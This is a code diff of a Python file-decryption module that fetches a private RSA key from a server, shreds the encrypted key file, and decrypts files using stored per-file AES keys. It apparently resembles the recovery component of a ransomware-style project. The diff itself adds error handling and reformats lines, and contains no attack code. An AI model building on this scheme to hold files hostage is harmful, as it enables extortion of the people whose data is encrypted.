@@ -22,21 +22,20 @@ logger = logging.getLogger(__name__)
 
 def decrypt_local_rsa_key():
     logger.info("Decrypting local RSA key")
-    unencrypted_local_private_key = get_decrypted_key_from_server()
+    try:
+        unencrypted_local_private_key = get_decrypted_key_from_server()
+    except Exception as err:
+        return False
+
     shred_file(ENCRYPTED_LOCAL_RSA_PRIVATE_KEY_FILE_LOCATION)
-    write_data_to_file(
-        UNENCRYPTED_LOCAL_RSA_PRIVATE_KEY_FILE_LOCATION, unencrypted_local_private_key
-    )
+    write_data_to_file(UNENCRYPTED_LOCAL_RSA_PRIVATE_KEY_FILE_LOCATION, unencrypted_local_private_key)
+    return True
 
 
 def decrypt_file_encryption_details():
-    local_master_private_key = read_data_from_file(
-        UNENCRYPTED_LOCAL_RSA_PRIVATE_KEY_FILE_LOCATION
-    )
+    local_master_private_key = read_data_from_file(UNENCRYPTED_LOCAL_RSA_PRIVATE_KEY_FILE_LOCATION)
     cipher = RSA(private_key=local_master_private_key)
-    encrypted_file_encryption_details = read_data_from_file(
-        ENCRYPTED_AES_KEY_FILE_LOCATION, serialized=False
-    )
+    encrypted_file_encryption_details = read_data_from_file(ENCRYPTED_AES_KEY_FILE_LOCATION, serialized=False)
 
     file_data = []
     for detail in encrypted_file_encryption_details:
@@ -78,22 +77,18 @@ def delete_key_files():
 
 
 def decrypt_files():
-    key_detail = read_data_from_file(
-        UNENCRYPTED_AES_KEY_FILE_LOCATION, serialized=False
-    )
+    key_detail = read_data_from_file(UNENCRYPTED_AES_KEY_FILE_LOCATION, serialized=False)
     for detail in key_detail:
-        aes_key, initialization_vector, file_path = decode_file_encryption_details(
-            detail
-        )
+        aes_key, initialization_vector, file_path = decode_file_encryption_details(detail)
         decrypt_file(aes_key, initialization_vector, file_path)
 
 
 def start_decryption():
-    decrypt_local_rsa_key()
-    if not os.path.exists(UNENCRYPTED_LOCAL_RSA_PRIVATE_KEY_FILE_LOCATION):
-        logger.info("Unencrypted RSA key not found")
-        return
-    decrypt_file_encryption_details()
-    decrypt_files()
-    delete_key_files()
+    if decrypt_local_rsa_key():
+        decrypt_file_encryption_details()
+        decrypt_files()
+        delete_key_files()
+        return "Decryption Successful"
+    else:
+        return "Decryption Failed"
 
